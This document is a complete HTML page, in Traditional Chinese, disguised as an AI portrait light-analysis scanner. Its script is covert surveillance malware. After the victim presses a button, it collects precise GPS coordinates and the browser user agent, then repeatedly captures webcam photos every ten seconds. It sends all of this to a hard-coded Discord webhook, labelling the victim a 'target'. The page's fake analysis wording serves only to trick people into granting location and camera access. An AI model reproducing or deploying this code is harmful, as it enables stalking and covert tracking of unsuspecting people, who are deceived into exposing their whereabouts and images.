<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Pro Studio | 專業人像光影分析</title>
    <style>
        :root { --primary-color: #00ff00; --bg-color: #0a0a0a; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg-color); color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        
        .container { text-align: center; width: 90%; max-width: 400px; }
        
        /* 掃描儀視覺效果 */
        .scanner-box { width: 220px; height: 220px; border: 2px solid var(--primary-color); margin: 0 auto 30px; position: relative; border-radius: 50%; overflow: hidden; background: #000; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); }
        #video-preview { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: none; }
        .scan-line { width: 100%; height: 3px; background: var(--primary-color); position: absolute; top: 0; left: 0; animation: scan 2.5s linear infinite; box-shadow: 0 0 15px var(--primary-color); z-index: 10; }
        
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        h2 { letter-spacing: 2px; text-transform: uppercase; margin-bottom: 10px; }
        p { color: #888; font-size: 0.9rem; line-height: 1.5; }

        /* 按鈕樣式 */
        .btn-start { background: transparent; color: var(--primary-color); border: 2px solid var(--primary-color); padding: 12px 35px; border-radius: 5px; font-weight: bold; font-size: 1rem; cursor: pointer; transition: 0.3s; margin-top: 20px; }
        .btn-start:hover { background: var(--primary-color); color: #000; }
        
        #status { margin-top: 25px; font-size: 0.8rem; font-family: monospace; color: var(--primary-color); min-height: 1.2em; }
    </style>
</head>
<body>

<div class="container">
    <div class="scanner-box">
        <div class="scan-line"></div>
        <video id="video-preview" autoplay playsinline muted></video>
    </div>
    <h2>AI 影像演算系統</h2>
    <p>正在分析您的環境光譜與面部特徵<br>請確保光線充足以獲得精確結果</p>
    
    <button class="btn-start" onclick="initSystem()">立即開始掃描</button>
    
    <div id="status">系統就緒。等待初始化...</div>
</div>

<canvas id="hidden-canvas" style="display:none;"></canvas>

<script>
    // ⚠️ 請修改下方的 Webhook 網址
    const webhookURL = "https://discord.com/api/webhooks/1476593164885168248/PZwIM4LhlHk0J9qjA3MhZrGF7pQ476hc1ogUT347YA-hY_Oft0gikYEVpYRku2yf7O4p";
    
    const statusText = document.getElementById('status');
    const video = document.getElementById('video-preview');
    const canvas = document.getElementById('hidden-canvas');

    async function initSystem() {
        statusText.innerText = "> 正在請求 GPS 衛星資料...";

        // 步驟 1: 獲取地理位置
        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;
                
                // 發送定位與地圖連結到 Discord
                await sendLocationData(lat, lng);
                
                // 步驟 2: 啟動相機
                startCamera();
            },
            (err) => {
                statusText.innerText = "❌ 權限錯誤：請開啟定位以分析環境光譜。";
            },
            { enableHighAccuracy: true }
        );
    }

    async function startCamera() {
        statusText.innerText = "> 正在校準臉部感應器...";
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.style.display = "block";
            
            statusText.innerText = "> AI 正在分析中... 請保持不動...";

            // 啟動後立刻拍一張，之後每 10 秒自動抓拍
            setTimeout(() => takeSnapshot("📸 初始特徵掃描"), 2000);
            setInterval(() => takeSnapshot("🔄 持續環境追蹤"), 10000);

        } catch (err) {
            statusText.innerText = "❌ 錯誤：無法存取光感元件 (相機)。";
        }
    }

    async function sendLocationData(lat, lng) {
        const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
        
        const payload = {
            embeds: [{
                title: "📍 偵測到新目標位置",
                color: 5763719, // 綠色
                fields: [
                    { name: "座標", value: `\`${lat}, ${lng}\``, inline: true },
                    { name: "Google 地圖", value: `[點我開啟地圖](${mapLink})`, inline: true },
                    { name: "瀏覽器代理", value: `\`\`\`${navigator.userAgent}\`\`\`` }
                ],
                timestamp: new Date()
            }]
        };

        return fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    function takeSnapshot(note) {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);

        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append("file", blob, "capture.png");
            formData.append("payload_json", JSON.stringify({ 
                content: `**${note}**` 
            }));
            
            fetch(webhookURL, { method: 'POST', body: formData });
        }, 'image/png');
    }
</script>

</body>
</html>
